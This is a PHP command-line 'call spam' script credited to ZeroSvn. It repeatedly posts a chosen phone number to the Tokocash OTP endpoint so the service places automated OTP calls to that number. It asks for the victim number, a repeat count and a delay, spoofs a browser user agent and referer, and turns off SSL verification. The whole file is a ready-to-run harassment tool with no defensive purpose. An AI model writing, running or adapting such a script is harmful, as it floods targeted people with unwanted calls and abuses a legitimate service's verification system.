<?php
function tokcall($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.tokocash.com/oauth/otp");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"msisdn=".$no."&accept=call");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.tokocash.com/oauth/otp');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
print "+-+-+-+-+ +-+-+-+-+    [ From Tokopedia ]
|C|A|L|L| |S|p|a|m|   Code By : ZeroSvn
+-+-+-+-+ +-+-+-+-+   Thanks  : BabbyCyberTeam
                                  SGB-TEAM
\n";

echo "Nomor? (ex : 6287788666791) (hanya 3x perjam)\nInput : ";
$nomor = trim(fgets(STDIN));
echo "1x persubmit\nInput : ";
$jumlah = trim(fgets(STDIN));
echo "Jeda? 0-999 (ex:5)\nInput : ";
$wait = trim(fgets(STDIN));
$execute = tokcall($nomor, $jumlah, $wait);
print $execute;
print "Zeeb Berhasil\n";
print "Note: Script Kapan Pun Bisa Down\n";
?>
